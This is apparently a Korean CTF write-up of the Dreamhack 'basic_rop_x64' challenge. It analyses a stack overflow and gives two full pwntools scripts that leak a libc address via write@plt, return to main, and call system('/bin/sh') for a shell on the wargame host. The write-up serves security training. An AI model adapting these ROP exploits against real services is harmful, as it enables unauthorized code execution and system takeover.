# Exploit Tech: ROP x64

# 분석 및 설계

## 보호 기법

---

checksec을 사용하여 적용된 보호 기법을 파악한다.

```c
$ checksec basic_rop_x64
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ASLR과 NX가 적용되어 있다.
canary와 PIE는 적용되지 않았다.

## 코드 분석

---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

buf의 크기는 0x40이지만 read() 함수에서 buf 변수에 0x400 크기의 입력을 받고 있다. 따라서 스택 버퍼 오버플로우가 발생한다.

# 익스플로잇

## 익스플로잇

---

ROP를 사용하여 system(”/bin/sh”)를 실행하는 것이 목표이다. 해당 기능을 실행하기 위해서는 여러 가젯과 인자로 들어갈 값들을 찾아야한다.

buf와 SFP에 해당하는 0x48 바이트를 패딩하고 ret을 원하는 값으로 설정하면 바이너리의 실행 흐름을 조작할 수 있다.

### system 함수 주소 계산

앞선 실습들과 동일한 방식으로 system 함수의 주소를 계산할 수 있다.

### “/bin/sh” 문자열

앞선 실습에서는 “/bin/sh” 문자열을 system 뒤에 두어 위치를 파악하고 사용하였지만, 이번 실습에서는 libc.so.6에 이미 존재하는 /bin/sh 문자열을 이용하였다.

pwntools의 ELF를 사용하여 libc를 불러온 뒤, libc에서 search 메서드 함수를 사용하여 구할 수 있다.

```c
from pwn import *

libc = ELF("./libc.so.6", checksec=False)
sh = list(libc.search(b"/bin/sh"))[0]
```

### 시나리오

라이브러리의 Base 주소를 모르기 때문에 바로 system(”/bin/sh”)를 실행하기는 어려움이 있다. 따라서 ret2main 기법을 사용한다.

payload에 write(1, read@got, …) 의 코드 이후 main 함수의 주소를 넣어서 RET를 조작하면 main 함수로 돌아올 수 있다.

## 솔브 코드

---

나의 코드

```c
from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host8.dreamhack.games", 16836)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

context.arch = "amd64"

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
main = e.symbols["main"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
ret = 0x4005a9

# write(1, read_got, ...)
payload = b'A'*0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

payload += p64(main)

p.send(payload)
p.recvuntil(b'A'*0x40)
read = u64(p.recv(6) + b'\x00'*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
binsh = lb + sh

slog("read", read)
slog("library", lb)
slog("system", system)
slog("/bin/sh", binsh)

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b"A"*0x40)

p.interactive()
```

드림핵 코드

```c
from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

#context.log_level = 'debug'

p = remote('host3.dreamhack.games', 10263)
#p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
#libc = e.libc
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

# Stage 2
payload: bytes = b'A' * 0x48

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```

드림핵 코드에서는  ROP 클래스의 메서드 함수인 find_gadget을 사용하여 구했다.

0x48을 보내고 0x40 만 recvuntil 하는 이유는 write이 buf의 크기인 0x40만큼만 출력하기 때문이다.

ret2main 공격 방식을 사용하면 GOT Overwrite를 하지 않고도 ROP를 할 수 있다.